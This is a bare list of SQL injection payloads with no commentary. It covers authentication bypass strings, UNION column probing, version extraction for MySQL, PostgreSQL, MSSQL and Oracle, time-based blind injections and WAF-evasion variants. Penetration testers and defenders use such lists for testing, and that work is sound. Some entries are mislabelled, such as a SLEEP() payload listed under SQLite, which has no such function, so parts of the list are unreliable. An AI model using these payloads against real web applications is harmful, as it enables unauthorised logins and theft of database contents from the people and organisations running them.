# SQL Injection Payload Collection

## Authentication bypass
```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1--
admin' --
admin' #
1' OR '1'='1
1' OR 1=1--
'=' 'OR' --
```

## Union injection
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT 1,2,3,4,5--
' UNION SELECT 1,'test',3,4,5--
' UNION SELECT 1,@@version,3,4,5--
```

## Database version extraction
```
# MySQL
' UNION SELECT @@version,NULL--
' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--
# PostgreSQL
' UNION SELECT version(),NULL--
' AND 1=(SELECT 1 FROM PG_SLEEP(5))--
# MSSQL
' UNION SELECT @@VERSION,NULL--
' WAITFOR DELAY '0:0:5'--
# Oracle
' UNION SELECT banner,NULL FROM v$version--
' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

## Time-based blind
```
# MySQL
' AND SLEEP(5)--
' AND (SELECT SLEEP(5))--
# PostgreSQL
' AND PG_SLEEP(5)--
' AND (SELECT PG_SLEEP(5))--
# MSSQL
'; WAITFOR DELAY '0:0:5'--
# SQLite
' AND (SELECT 1234 FROM (SELECT(SLEEP(5)))A)--
' AND RANDOMBLOB(100000000)--
```

## WAF bypass examples
```
' /**/ OR /**/ 1=1 --
SEL/**/ECT
' SeLeCt 1 --
' UNION SELECT 1 --
'%09UNION%09SELECT 1--
%27%20UNION%20SELECT%201--
' UN/**/ION SEL/**/ECT 1--
```
